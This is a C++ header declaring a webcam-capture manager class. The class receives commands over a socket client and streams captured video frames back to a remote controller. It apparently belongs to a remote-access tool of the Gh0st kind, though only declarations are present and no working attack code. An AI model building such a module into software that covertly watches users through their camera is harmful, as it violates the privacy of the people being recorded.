#pragma once
#include "Manager.h"
#include "CaptureVideo.h"


enum
{
	COMMAND_NEXT_CWebCamDlg,
	COMMAND_WEBCAM_ENABLECOMPRESS,
	COMMAND_WEBCAM_DISABLECOMPRESS,
	COMMAND_WEBCAM_RESIZE,
	TOKEN_WEBCAM_DIB,
	COMMAND_WEBCAM_EXCEPTION,

};



class CVideoManager : public CManager  
{
public:
	BOOL m_buser;
	void Destroy();
	bool Initialize();
	CVideoManager(ISocketBase*pClient);
	virtual ~CVideoManager();
	virtual void OnReceive(LPBYTE lpBuffer, UINT nSize);
	void sendBITMAPINFO();
	void sendNextScreen();
	BOOL m_bIsWorking;
private:
	int			m_SelectedDevice;
	int			m_SelectedOld;
	std::string m_DeviceList;
	CCaptureVideo *m_pCapVideo;
	DWORD	m_fccHandler;
	int	m_nVedioWidth;
	int	m_nVedioHeight;
	int m_nOldWidth;
	int m_nOldHeight;
	int m_nDevicesNum;
	BOOL m_bIsCompress;
	HANDLE	m_hWorkThread;
    void StartCapture();
	void ResetScreen(int nWidth, int nHeight);
	static unsigned __stdcall WorkThread(LPVOID lparam);

};
